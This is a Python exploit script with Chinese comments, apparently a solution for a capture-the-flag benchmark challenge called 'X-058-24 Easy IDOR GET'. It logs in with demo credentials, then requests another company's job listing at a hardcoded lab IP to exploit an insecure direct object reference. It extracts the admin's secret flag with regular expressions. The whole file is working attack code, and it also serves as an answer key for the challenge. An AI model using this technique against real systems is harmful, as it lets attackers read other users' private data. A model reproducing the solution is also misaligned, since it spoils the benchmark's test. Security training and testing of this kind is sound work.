#!/usr/bin/env python3
"""
X-058-24 Easy IDOR GET - 漏洞利用脚本

利用IDOR漏洞获取管理员用户的secret job中的flag
"""

import sys
import requests
import re
from urllib.parse import urljoin

class XBEN058Exploit:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def login(self, username='demo', password='demo'):
        """登录获取访问令牌"""
        login_url = urljoin(self.base_url, '/token')
        login_data = {
            'username': username,
            'password': password
        }

        print(f"[+] 尝试登录用户: {username}")

        try:
            response = self.session.post(login_url, data=login_data, allow_redirects=False)

            if response.status_code == 303:
                # 从响应头获取location信息
                location = response.headers.get('location', '')
                print(f"[+] 登录成功，重定向到: {location}")

                # 获取设置的cookie
                cookies = response.headers.get('set-cookie', '')
                print(f"[+] 获得Cookie: {cookies}")

                return True
            else:
                print(f"[-] 登录失败，状态码: {response.status_code}")
                return False

        except Exception as e:
            print(f"[-] 登录过程中出错: {e}")
            return False

    def exploit_idor(self, target_company_id=2):
        """利用IDOR漏洞访问目标公司的job列表"""
        jobs_url = urljoin(self.base_url, f'/company/{target_company_id}/jobs')

        print(f"[+] 正在访问company/{target_company_id}/jobs...")

        try:
            response = self.session.get(jobs_url)

            if response.status_code == 200:
                print(f"[+] 成功访问company/{target_company_id}/jobs")

                # 解析HTML内容寻找flag
                html_content = response.text

                # 查找secret job
                if 'secret' in html_content:
                    print("[+] 发现secret job!")

                    # 使用正则表达式提取flag - 匹配 secret:flag{...} 格式
                    flag_patterns = [
                        r'secret:([^<\n\r\s]+)',
                        r'secret:([^<\n\r]{10,})',
                        r'secret.*?flag\{[^}]+\}',
                        r'secret[^:]*:[^<\n\r]*flag\{[^}]+\}',
                        r'flag\{[a-f0-9\-]+\}',
                    ]

                    for pattern in flag_patterns:
                        matches = re.findall(pattern, html_content, re.IGNORECASE | re.MULTILINE)
                        if matches:
                            flag = matches[0].strip()
                            # 如果匹配到的是完整的flag格式，直接使用；否则加上flag{}格式
                            if flag.startswith('flag{'):
                                print(f"[+] 找到Flag: {flag}")
                                return flag
                            else:
                                print(f"[+] 找到Secret内容: {flag}")
                                return flag

                # 输出部分HTML用于调试
                print("[-] 未在页面中找到flag")
                print("页面内容摘要:")
                print(html_content[:500] + "..." if len(html_content) > 500 else html_content)

                return None
            else:
                print(f"[-] 访问失败，状态码: {response.status_code}")
                return None

        except Exception as e:
            print(f"[-] 访问过程中出错: {e}")
            return None

    def run(self):
        """执行完整的漏洞利用流程"""
        print("=" * 60)
        print("X-058-24 Easy IDOR GET 漏洞利用脚本")
        print("=" * 60)

        # 步骤1：登录
        if not self.login():
            print("[-] 登录失败，无法继续利用")
            return False

        # 步骤2：利用IDOR漏洞获取flag
        flag = self.exploit_idor()

        if flag:
            print(f"\n[+] 漏洞利用成功!")
            print(f"[+] Flag: {flag}")
            return True
        else:
            print("\n[-] 未能获取flag，可能目标系统已修复")
            return False

def main():
    # 直接使用目标URL
    target_url = "http://10.12.190.19:8000"

    print(f"[*] 目标URL: {target_url}")

    exploit = XBEN058Exploit(target_url)
    success = exploit.run()

    if success:
        sys.exit(0)
    else:
        sys.exit(1)

if __name__ == "__main__":
    main()